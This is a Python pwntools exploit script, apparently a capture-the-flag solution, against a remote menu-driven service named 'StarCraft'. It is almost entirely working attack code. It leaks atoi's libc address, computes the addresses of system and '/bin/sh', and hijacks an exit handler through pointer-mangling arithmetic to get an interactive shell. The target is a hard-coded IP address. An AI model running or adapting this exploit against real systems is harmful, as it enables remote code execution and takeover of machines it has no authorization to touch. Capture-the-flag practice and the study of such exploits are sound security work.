#!/usr/bin/env python
# coding=utf-8

from pwn import *
from pwnlib.log import *

port = 12321
service = 'StarCraft'
timeout = 30
author = "izhuer"

def output(name, data):
    info(name + ': %#x', data)

def lmov(data):
    bit = data >> 31
    data = data << 1;
    data = (data | bit) & 0xffffffff
    return data


def exploit(ip):
    # r = process('./StarCraft') #, aslr = False)
    # pid = r.proc.pid
    r = remote(ip, port)
    # r = remote('localhost', port)
    # r.recvuntil('Pid of subprocess: ')
    # pid = int(r.recvline().strip())
    # e = ELF('./StarCraft')
    # context.log_level = 'debug'
    context.terminal = ['tmux', 'splitw', '-h']

    script = """
    b exit
    """
    # gdb.attach(pid, execute = script)

    ###################### exp starts here #####################

    map(r.sendline, ['1', '24', "zhangzhuo"])
    r.recvuntil('Menu')

    for i in xrange(9):
        map(r.sendline, ['6', '1', str(9 - i), str(9 - i), 'y'])
        r.recvuntil('Menu')

    map(r.sendline, ['3', '0', '0'])
    r.recvuntil('Menu')

    map(r.sendline, ['5', '2', '1', 'zz'])
    r.recvuntil('Menu')

    for i in xrange(7):
        map(r.sendline, ['4', '1', '1'])
        r.recvuntil('Menu')


    map(r.sendline, ['6', '1', '0', '0', 'y'])
    r.recvuntil('Menu')

    map(r.sendline, ['6', '1', '0', '0', 'y'])
    r.recvuntil('Menu')

    map(r.sendline, ['2', '32', p32(0x804cffc) + p32(0x1) + p32(0) * 5])
    r.recvuntil('Menu')
    map(r.sendline, ['6', '2', '0'])
    r.recvuntil("a version ")
    atoi_addr = u32(r.recv(4))
    output("atoi_addr", atoi_addr)
    system_addr = atoi_addr - 0x0002f850 + 0x0003e3e0
    output("system_addr", system_addr)
    binsh_addr = atoi_addr - 0x0002f850 + 0x15f551
    output("binsh_addr", binsh_addr)
    xor_addr = atoi_addr - 0x30138
    output("xor_addr", xor_addr)
    exit_funcs_addr = atoi_addr + 0x17a990
    output("exit_funcs_addr", exit_funcs_addr)
    r.recvuntil('Menu')

    target_data = system_addr
    output("target_data", target_data)
    for i in xrange(9):
        target_data = lmov(target_data)
    output("target_data", target_data)

    map(r.sendline, ['2', '32', p32(binsh_addr) + p32(exit_funcs_addr + 0xc) + p32(xor_addr)])
    r.recvuntil('war!\n')
    r.sendline('0')
    r.recvuntil('nickname\n')
    r.sendline(p32(target_data) + p32(binsh_addr))

    r.interactive()

    ######################### exp ends #########################

if __name__ == "__main__":
    exploit('202.120.7.212')
